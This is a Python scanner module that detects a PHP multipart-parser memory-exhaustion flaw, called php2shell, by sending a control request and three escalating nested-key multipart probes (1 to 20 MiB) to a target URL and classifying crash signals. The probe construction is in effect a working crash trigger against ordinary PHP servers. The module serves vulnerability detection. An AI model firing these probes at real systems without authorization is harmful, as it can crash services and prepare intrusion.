"""lib/oomprobe.py — active php2shell detection (CVE-2026-109618/109619).

Method follows the public assetnote/php2shell-scanner approach:
  1. control request : small valid multipart (baseline; MUST return a
     non-empty body) — used as a comparison.
  2. 3 OOM probes    : multipart with a 62-level nested array key, sizes
     rising 1 MiB → 8 MiB → 20 MiB. This nested-key structure is what trips
     the upload-progress / php_default_treat_data path vulnerable to
     CVE-2026-109618/109619.

VULNERABLE signal (first match wins):
  S1 : probe body contains fatal "Allowed memory size of ... bytes
       exhausted" AND location "Unknown" — OOM happened INSIDE the
       multipart parser (not in app code).
  S2 : differential empty-500 — control returns a body, probe answers
       HTTP 500 with an empty body (FPM worker dies mid-request).
  S3 : worker abort — probe answers 502/503/504 while control is healthy.
  S4 : empty-200 — probe answers HTTP 200 with empty body while control
       has a body (FPM worker-died variant; front still answers).

SAPI gating (follows the official scanner):
  S3/S4 only valid for sapi "fpm"/"auto"; under "mod_php" a worker death
  takes Apache down and produces no front-server response.

NOT a signal:
  - 4xx WAF reject (400/403/413/429/431/...) → "blocked", not a verdict.
  - 500 with a NON-empty body (ordinary app error) → inconclusive.
  - control itself is 5xx → target is unhealthy, probe cancelled
    (INCONCLUSIVE) so we do not accuse the wrong party.

Ethical limits:
  - max 4 requests per target (1 control + 3 probes), NO retries —
    transport is used with retries=0 so OOM never re-sends a multi-MB body.
  - no automatic escalation above 20 MiB.
  - results always carry evidence (status / body length / fatal snippet).
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .transport import Transport

# ---- method constants (follow the public assetnote scanner) ----
NESTED_KEYS = 62                    # depth of nested array key
PROBES_MB = (1, 8, 20)              # escalating probe sizes (MiB)
CHUNK = 64 * 1024                   # chunk size for body construction

REJECT_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}

_FATAL_MARKERS = (b"Allowed memory size of", b"bytes exhausted")
_FATAL_LOC_UNKNOWN = b"Unknown"

# false-positive guard: PHP rejects POSTs exceeding post_max_size BEFORE
# the multipart parser runs; the warning is also located "Unknown" so without
# this filter it could be mis-trusted as S1.
_POSTLEN_MARKER = b"POST Content-Length of"

FPM_ABORT_STATUSES = (502, 503, 504)


@dataclass
class OOMResult:
    verdict: str = "inconclusive"
    signal: str = ""
    evidence: str = ""
    probes_sent: int = 0
    probe_results: list[dict] = field(default_factory=list)
    error: str = ""

    def as_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "signal": self.signal,
            "evidence": self.evidence,
            "probes_sent": self.probes_sent,
            "probe_results": self.probe_results,
            "error": self.error,
        }


def _nested_name(level: int = NESTED_KEYS) -> str:
    """Multipart field name with a nested array key: a[b][c]... 62 deep."""
    return "a" + "[b]" * (level - 1)


def _multipart_body(field_name: str, payload: bytes,
                    boundary: str = "x") -> bytes:
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'
    ).encode()
    return head + payload + f"\r\n--{boundary}--\r\n".encode()


def _build_payload(size_mb: int) -> bytes:
    """'A' * n built per-chunk to keep scanner memory low."""
    total = size_mb * 1024 * 1024
    block = b"A" * CHUNK
    parts = []
    left = total
    while left > 0:
        take = min(CHUNK, left)
        parts.append(block[:take])
        left -= take
    return b"".join(parts)


def _classify_response(resp, control_body_len: int,
                       sapi: str = "auto") -> tuple[str, str]:
    """Map one probe response to (verdict, signal) per signals S1-S4."""
    body_b = (resp.body or "").encode("utf-8", "replace")
    body_len = len(body_b)
    status = resp.status

    if _POSTLEN_MARKER in body_b:
        return "inconclusive", "post_len_rejected"

    has_oom = all(m in body_b for m in _FATAL_MARKERS)
    if has_oom and _FATAL_LOC_UNKNOWN in body_b:
        return "vulnerable", "oom_in_parser"

    if status == 500 and control_body_len > 0 and body_len == 0:
        return "vulnerable", "empty_500"

    if status in REJECT_STATUSES:
        return "blocked", "rejected"

    if status == 500 and body_len > 0:
        return "inconclusive", "nonempty_500"

    if sapi != "mod_php":
        if status in FPM_ABORT_STATUSES:
            return "vulnerable", "worker_abort"
        if status == 200 and control_body_len > 0 and body_len == 0:
            return "vulnerable", "empty_200"

    return "inconclusive", "no_signal"


def oom_detect(
    url: str,
    transport: Transport | None = None,
    proxy: str | None = None,
    profile: str = "chrome",
    timeout: int = 30,
    sapi: str = "auto",
) -> OOMResult:
    """Active php2shell detection: control + 3 nested-62 OOM probes.

    sapi: "auto" (combined mod_php+FPM rules, default) | "mod_php" | "fpm".

    Transport is built internally with retries=0 (large payloads must never
    be re-sent automatically). If a `transport` is supplied, retries is
    forced to 0 for this probe for target safety.
    """
    own = transport is None
    if own:
        t = Transport(profile=profile, timeout=timeout, retries=0, proxy=proxy)
    else:
        t = transport
        t.retries = 0  # never retry large payloads

    res = OOMResult()
    try:
        # ---- 1. control: small valid multipart ----
        control_name = _nested_name()
        c_body = _multipart_body(control_name, b"hello", boundary="x")
        control = t.post(
            url,
            data=c_body,
            headers={
                "Content-Type": 'multipart/form-data; boundary="x"',
                "Content-Length": str(len(c_body)),
            },
        )
        if control.error:
            res.verdict = "error"
            res.error = f"control: {control.error}"
            return res
        if control.status >= 500:
            res.verdict = "inconclusive"
            res.signal = "control_unhealthy"
            res.evidence = f"control HTTP {control.status} before any probe"
            return res

        ctrl_body_len = len((control.body or "").encode("utf-8", "replace"))

        # ---- 2. three escalating OOM probes ----
        for mb in PROBES_MB:
            payload = _build_payload(mb)
            body = _multipart_body(_nested_name(), payload, boundary="x")
            r = t.post(
                url,
                data=body,
                headers={
                    "Content-Type": 'multipart/form-data; boundary="x"',
                    "Content-Length": str(len(body)),
                },
            )
            res.probes_sent += 1
            if r.error:
                res.probe_results.append({
                    "probe_mb": mb, "status": 0, "verdict": "error",
                    "signal": "transport_error", "evidence": r.error,
                })
                if res.verdict != "vulnerable":
                    res.verdict = "inconclusive"
                    res.signal = "transport_error"
                    res.evidence = f"probe {mb}MiB: {r.error}"
                continue

            verdict, signal = _classify_response(r, ctrl_body_len, sapi=sapi)
            evid = f"probe {mb}MiB -> HTTP {r.status}, body {len(r.body or '')} B"
            res.probe_results.append({
                "probe_mb": mb, "status": r.status,
                "verdict": verdict, "signal": signal, "evidence": evid,
            })

            if verdict == "vulnerable":
                res.verdict = "vulnerable"
                res.signal = signal
                res.evidence = evid + (
                    " | fatal-in-parser" if signal == "oom_in_parser" else "")
                # keep probing to gather full evidence? stop on first hit.
                break
            elif verdict == "blocked" and res.verdict == "inconclusive":
                res.verdict = "blocked"
                res.signal = signal
                res.evidence = evid
        # end probes
        if res.verdict == "inconclusive" and not res.error:
            res.evidence = res.evidence or "no vulnerable signal across probes"
    except Exception as exc:  # noqa: BLE001
        res.verdict = "error"
        res.error = f"{type(exc).__name__}: {exc}"
    finally:
        if own:
            t.close()
    return res
